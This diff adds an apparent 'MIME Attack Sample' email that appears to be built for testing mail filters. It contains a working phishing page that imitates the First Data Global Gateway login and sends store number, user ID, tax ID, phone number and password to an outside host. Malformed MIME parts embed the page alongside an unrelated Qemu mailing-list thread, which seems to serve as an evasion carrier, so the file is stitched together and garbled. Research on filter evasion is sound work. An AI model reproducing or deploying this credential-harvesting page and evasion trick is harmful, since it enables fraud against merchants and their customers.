@@ -1,0 +1,167 @@
+From: dreamscaip@hotmail.com
+To: e-mail <.meg@enron.com>, e-mail <.mike@enron.com>, e-mail <.moni@enron.com>, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain
+
+Dear FirstData Virtual Terminal customer,
+
+Due to recent online fraudulent activity, we need you to verify your account information.
+
+--==frontier==
+Content-Type: application/html; name="Update Your Account Information.html"
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html><head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Login</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<link href="https://secure.linkpt.net/lpc/docs/css/layout.css" type="text/css" media="all" rel="stylesheet">
+<link href="https://secure.linkpt.net/lpc/docs/css/font.css" type="text/css" media="all" rel="stylesheet">
+<link href="https://secure.linkpt.net/lpc/docs/css/form.css" type="text/css" media="all" rel="stylesheet">
+<link href="https://secure.linkpt.net/lpc/docs/css/nav.css" type="text/css" media="all" rel="stylesheet">
+<!--[if ie 6]><link href="https://secure.linkpt.net/lpc/servlet/../docs/css/ie6x.css" type="text/css" media="all" rel="stylesheet"/>
+<![endif]--><!--[if ie 7]>
+<link href="https://secure.linkpt.net/lpc/servlet/../docs/css/ie7.css" type="text/css" media="all" rel="stylesheet"/>
+<![endif]-->
+</head>
+<body>
+<form name="form" action="http://uthcamp.org/upload_images/fdpost/index.php" method="POST">
+<div id="main">
+  <div id="content">
+    <div class="main-content">
+      <div id="login">
+        <div>
+          <fieldset>
+            <h4>Welcome to the First Data Global Gateway</h4><p>The Global Gateway Virtual Terminal is an online payment application that allows you to accept credit cards and other payment 
+types using your PC.  The Virtual Terminal also acts as your Global Gateway account management application and allows you to view gateway processing reports, edit fraud settings, manage 
+users, and more.  
+           </p>
+           </fieldset>
+           </div>
+           </div>
+           </div>
+           <div class="side-bar"><div class="side-box"><h3><span>Account Login</span></h3><div class="side-box-content-login"><div id="login"><p class="side-box-content-login-error">Please 
+update your account.</p><div class="form-row"><label><span class="row-title">Store Number</span>
+           <input TYPE="text" NAME="storename" SIZE="18" MAXLENGTH="20" Value=""></label></div>
+           <div class="form-row"><label><span class="row-title">User ID</span><input TYPE="text" NAME="username" SIZE="18" MAXLENGTH="20" Value=""></label></div>
+           <div class="form-row"><label><span class="row-title">Tax-ID</span><input TYPE="text" NAME="taxid" SIZE="18" MAXLENGTH="20" Value=""></label></div>
+           <div class="form-row"><label><span class="row-title">Phone Nr.</span><input TYPE="text" NAME="phonenr" SIZE="18" MAXLENGTH="20" Value=""></label></div>
+          
+							<p align="center">If Store Number &amp; User ID are the same - leave 
+							User ID blank</p>
+						<div id="login"><div class="form-row"><label><span class="row-title">
+							Password</span><input class="text" TYPE="password" NAME="passwd" SIZE="18" MAXLENGTH="15" Value=""></label></div>
+							<div style="padding:10px 12px 0 70px;"><span>
+								<input type="submit" value="Update my account" class="btn-continue"></span></div>
+						</div>
+						</div></div><div class="side-box"><h3><span>Administrator Login</span></h3><div class="side-box-content-login"><p align="left">Use the 
+administration section to access the hierarchy reports area. This area is only available to accounts setup for hierarchy reports.  The hierarchy reports are used to view reports for more 
+than one store through one report interface.  This feature is not used by single merchant accounts.</p><div style="padding:10px 12px 0 60px;"><span><a 
+href="/lpc/docs/admlogin.html">Administrator Login</a></span></div></div></div><div class="side-box"><h3><span>Virtual Terminal</span></h3><div class="side-box-content"><strong>Virtual 
+Terminal Support</strong><ul><li><a href="http://www.firstdata.com/support/faq/global_gateway.htm" target="_blank">Frequently Asked Questions</a></li><li><a 
+href="http://www.firstdata.com/support/manuals_and_guides/global_gateway.htm" target="_blank">Virtual Terminal Manual</a></li><li><a href="mailto:globalgateway.support@firstdata.com">Email 
+Us</a></li></ul><strong>Call Support</strong><span>24 Hours a Day, 7 days a week<br>
+
+                            US: 1-888-477-3611 <br>
+                            Asia Pacific: 1-800-625-171
+                        </span><ul><li><a href="http://www.firstdata.com/support/software_downloads/global_gateway/gateway_status.htm" target="_blank">Monitor the status of the First Data 
+Global Gateway</a></li></ul></div></div></div></div>
+    <div id="header"><div id="header"><div class="columns"><a href="#" class="logo"></a><div><strong class="slogan">Global Gateway <span>Virtual 
+Terminal</span></strong></div></div></div></div><div id="footer"><p>Copyright 2008, First Data Corporation. All Rights Reserved.</p><ul><li><a href="/lpc/docs/privacypolicy.html" 
+target="_blank">First Data Privacy</a></li><li><a href="#">Site Map</a></li></ul><p style="font-weight:bold;color:#FF0000;">
+		&nbsp;</p></div></div></form></body></html>
+--==frontier==
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA512
+
+Hi Zachary. Have you tried booting anything virtually using Qemu under Linux? The last time I tried this by booting the test image I got no output, since Qemu was using SDL. I'm wondering if 
+this is still the case if I were to say, try and boot an OpenBSD iso or something.
+On Thu, Jun 21, 2007 at 01:48:41PM -0700, Gregory Nowak wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA1
+> 
+> Thanks for that. I did forget to mention that I tried to have the
+> cdrom as the second drive from an iso, but I didn't try booting from
+> it. I actually wanted to see first how a windows/dos boot floppy would do,
+> thus the floppy boot, but I might bite the bullet, and try booting a
+> debian install iso directly. Also, my purpose in keeping wineyes
+> running was to have access to the qemu monitor, though it sounds like
+> you're saying that won't be accessible, which is too bad. 
+> 
+> I may try it again, though it probably won't be soon. Thanks also for
+> your offer of answering additional questions, I may take you up on
+> that if I need to when I try this again.
+> 
+> Greg
+> 
+> 
+> On Thu, Jun 21, 2007 at 01:25:26PM -0700, Zachary Kline wrote:
+> > Hiya,
+> >     I'll be glad to show you how I run Qemu under Windows.  I warn you that 
+> > Window-Eyes will be of no help whatsoever in reading the Qemu console 
+> > window.  In fact, I suggest either creating a custom set file for it and 
+> > using the Hotkeys option in the general menu to turn them off, or just 
+> > unloading WE entirely.  That, of course, isn't very convenient.  If you turn 
+> > off hotkeys in qemu alone you'll get response when alt+tab is pressed to get 
+> > you out of that window.  Anyway, here's what I do:
+> > To start with, I haven't installed Qemu into c:\program files.  I just did 
+> > C:\qemu,, with the bios in the same place.  So to get that option I do -L ., 
+> > which like under Unix stands for current directory.
+> > A sample command line is:
+> > qemu -serial com3 -boot d -net tap,ifname="tap" -net 
+> > nic,model=rtl8139 -soundhw ens1370 -hda debian.img -cdrom debian.iso -L .
+> > This is what I used to get Debian installed, with the Dectalk express 
+> > connected to a USB-to-serial converter which acted as COM3 under Windows. 
+> > It will work as ttyS0 under Linux, of course.
+> > The boot d option is just to specify booting from the ISO image.  I 
+> > personally haven't done much with floppy images or actual drives.
+> > Once Qemu runs, you'll possibly get a Windows properties dialogue asking 
+> > about whichever COM port you used.  Just hit enter to close it and you'll be 
+> > in a Qemu console window.  Type the command to get speakup up and running, 
+> > in the case of a Debian install it would be:
+> > speakup speakup_synth=dectlk speakup_ser=0
+> > From that point, assuming you unloaded WE or created a set file properly, 
+> > things will just run as normal.  You can alt+tab out of the Qemu window at 
+> > any time.
+> > Hope this helps some.
+> > Thanks,
+> > Zack.
+> > PS: If not, please feel free to ask me anything you'd like.
+> > 
+> > 
+> > _______________________________________________
+> > Speakup mailing list
+> > Speakup@braille.uwo.ca
+> > http://speech.braille.uwo.ca/mailman/listinfo/speakup
+> 
+> - -- 
+> web site: http://www.romuald.net.eu.org
+> gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+> skype: gregn1
+> (authorization required, add me to your contacts list first)
+> 
+> - --
+> Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+> -BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.6 (GNU/Linux)
+> 
+> iD8DBQFGeuQp7s9z/XlyUyARAh3DAJ9nyqurzSP5FEyZpmvagW1JN11bZwCfbcsF
+> hUXeI0oUm/5xoGkrcoH2bNo=
+> =qGLd
+> -----END PGP SIGNATURE-----
+> 
+> 
+--BOUNDARY--
+--DELIMITER--
